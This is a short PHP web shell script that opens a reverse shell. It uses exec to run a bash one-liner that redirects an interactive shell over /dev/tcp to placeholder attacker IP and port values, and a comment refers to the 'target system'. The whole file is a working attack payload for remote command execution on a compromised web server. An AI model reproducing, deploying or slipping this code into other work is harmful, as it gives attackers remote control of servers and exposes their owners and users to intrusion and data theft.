<?php
$ip = 'YOUR_SERVER_IP';
$port = YOUR_SERVER_PORT;
$shell = '/bin/bash'; // Change this to the appropriate shell for your target system

exec("bash -c 'bash -i >& /dev/tcp/{$ip}/{$port} 0>&1'");
?>
